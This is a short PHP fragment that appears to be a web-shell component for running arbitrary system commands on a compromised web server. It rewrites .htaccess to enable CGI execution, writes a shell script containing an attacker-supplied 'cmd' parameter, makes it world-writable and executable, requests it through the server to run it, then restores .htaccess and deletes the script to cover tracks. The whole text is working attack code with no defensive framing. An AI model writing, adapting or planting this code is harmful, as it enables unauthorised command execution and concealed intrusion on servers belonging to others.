try {
    @copy(".htaccess", ".htaccess.bak");
    $suffix=substr(md5(time()) ,0,5);
    $fileName=md5(time()).'.'.$suffix;
    @file_put_contents('.htaccess', "Options +ExecCGI\nAddHandler cgi-script .".$suffix);
    @file_put_contents($fileName, "#!/bin/sh\necho&&".get("cmd"));
    @chmod($fileName, 0777);;

    $url=parse_url(get("shellurl").$fileName);
    $target=$url['scheme']."://".$_SERVER['HTTP_HOST'].$url['path'];
    echo @file_get_contents($target);
    @unlink(".htaccess");
    @rename(".htaccess.bak",".htaccess");
    @unlink($fileName);


} catch (Exception $e) {
    echo "ERROR://".$e -> getMessage();
}